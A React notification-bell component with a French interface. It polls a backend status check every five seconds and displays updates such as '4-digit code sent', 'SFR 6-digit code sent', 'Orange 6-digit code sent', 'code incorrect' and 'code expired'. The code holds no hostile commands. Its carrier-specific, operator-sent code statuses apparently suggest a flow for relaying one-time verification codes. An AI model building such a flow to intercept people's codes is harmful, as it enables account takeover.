import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Bell, CheckCircle2, AlertCircle, Clock, KeyRound, Zap } from "lucide-react";
import { base44 } from "@/api/base44Client";

const STATUS_CONFIG = {
  pending: { label: "Demande envoyée", icon: Clock, color: "text-blue-400", bg: "bg-blue-500/10" },
  code_ready: { label: "Code envoyé (4 chiffres)", icon: KeyRound, color: "text-amber-400", bg: "bg-amber-500/10" },
  code6_ready: { label: "Code envoyé (6 chiffres)", icon: KeyRound, color: "text-amber-400", bg: "bg-amber-500/10" },
  code6sfr_ready: { label: "Code 6 SFR envoyé", icon: KeyRound, color: "text-amber-400", bg: "bg-amber-500/10" },
  code6orange_ready: { label: "Code 6 Orange envoyé", icon: KeyRound, color: "text-amber-400", bg: "bg-amber-500/10" },
  code_valid: { label: "Demande validée", icon: CheckCircle2, color: "text-green-400", bg: "bg-green-500/10" },
  code_wrong: { label: "Code incorrect", icon: AlertCircle, color: "text-red-400", bg: "bg-red-500/10" },
  code_expired: { label: "Code expiré", icon: AlertCircle, color: "text-orange-400", bg: "bg-orange-500/10" },
  waiting_queue: { label: "En file d'attente", icon: Zap, color: "text-purple-400", bg: "bg-purple-500/10" },
};

export default function NotificationBell() {
  const [open, setOpen] = useState(false);
  const [notifications, setNotifications] = useState(() => {
    try { return JSON.parse(sessionStorage.getItem("notifHistory")) || []; } catch { return []; }
  });
  const [hasNew, setHasNew] = useState(false);
  const [toast, setToast] = useState(null);
  const ref = useRef(null);
  const lastStatusRef = useRef(null);
  const toastTimer = useRef(null);

  useEffect(() => {
    const poll = async () => {
      try {
        const submissionId = sessionStorage.getItem("submissionId");
        if (!submissionId) return;
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        const status = res?.data?.status;
        if (status && status !== lastStatusRef.current) {
          lastStatusRef.current = status;
          const config = STATUS_CONFIG[status];
          if (config) {
            const newNotif = {
              id: Date.now(),
              status,
              label: config.label,
              timestamp: new Date().toISOString(),
            };
            setNotifications(prev => {
              const updated = [newNotif, ...prev].slice(0, 10);
              sessionStorage.setItem("notifHistory", JSON.stringify(updated));
              return updated;
            });
            setHasNew(true);
            setToast(newNotif);
            if (toastTimer.current) clearTimeout(toastTimer.current);
            toastTimer.current = setTimeout(() => setToast(null), 6000);
          }
        }
      } catch (e) {}
    };
    poll();
    const interval = setInterval(poll, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handler = (e) => {
      if (ref.current && !ref.current.contains(e.target)) setOpen(false);
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  useEffect(() => {
    if (open) setHasNew(false);
  }, [open]);

  useEffect(() => {
    return () => { if (toastTimer.current) clearTimeout(toastTimer.current); };
  }, []);

  const toastConfig = toast ? (STATUS_CONFIG[toast.status] || { icon: Bell, color: "text-muted-foreground", bg: "bg-muted" }) : null;
  const ToastIcon = toastConfig?.icon;

  return (
    <>
      <AnimatePresence>
        {toast && toastConfig && ToastIcon && (
          <motion.div
            key={toast.id}
            initial={{ opacity: 0, y: -24, scale: 0.96 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -24, scale: 0.96 }}
            transition={{ type: "spring", stiffness: 320, damping: 26 }}
            className="fixed top-4 md:top-6 left-1/2 -translate-x-1/2 z-[60] w-[calc(100%-2rem)] max-w-sm mx-auto"
          >
            <div className="bg-card border border-border rounded-2xl shadow-2xl shadow-black/50 px-4 py-3 flex items-center gap-3">
              <div className={`w-9 h-9 rounded-lg ${toastConfig.bg} flex items-center justify-center flex-shrink-0`}>
                <ToastIcon className={`w-5 h-5 ${toastConfig.color}`} />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-semibold text-foreground">{toastConfig.label}</p>
                <p className="text-xs text-muted-foreground/60">Mise à jour de votre demande</p>
              </div>
              <button
                onClick={() => setToast(null)}
                className="text-muted-foreground hover:text-foreground text-lg leading-none px-1"
              >×</button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <div className="relative" ref={ref}>
        <button
          onClick={() => setOpen(!open)}
          className="relative w-10 h-10 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-muted transition-colors"
        >
          <Bell className="w-5 h-5 text-foreground" />
          {hasNew && (
            <span className="absolute top-1.5 right-1.5 w-2.5 h-2.5 bg-primary rounded-full ring-2 ring-background animate-pulse" />
          )}
        </button>
        <AnimatePresence>
          {open && (
            <motion.div
              initial={{ opacity: 0, y: -8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              className="absolute top-12 right-0 w-80 max-w-[calc(100vw-2rem)] bg-card border border-border rounded-2xl shadow-2xl shadow-black/40 z-50 overflow-hidden"
            >
              <div className="px-4 py-3 border-b border-border bg-muted/30">
                <h3 className="font-heading text-sm font-bold text-foreground">Vos notifications</h3>
              </div>
              <div className="max-h-80 overflow-y-auto">
                {notifications.length === 0 ? (
                  <p className="px-4 py-8 text-center text-muted-foreground text-sm">Aucune notification pour le moment</p>
                ) : (
                  notifications.map((notif) => {
                    const config = STATUS_CONFIG[notif.status] || { icon: Bell, color: "text-muted-foreground", bg: "bg-muted" };
                    const Icon = config.icon;
                    return (
                      <div key={notif.id} className="px-4 py-3 border-b border-border/50 hover:bg-muted/30 transition-colors flex items-start gap-3">
                        <div className={`w-8 h-8 rounded-lg ${config.bg} flex items-center justify-center flex-shrink-0`}>
                          <Icon className={`w-4 h-4 ${config.color}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-medium text-foreground">{notif.label}</p>
                          <p className="text-xs text-muted-foreground/60 mt-0.5">
                            {new Date(notif.timestamp).toLocaleString("fr-FR", { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
                          </p>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </>
  );
}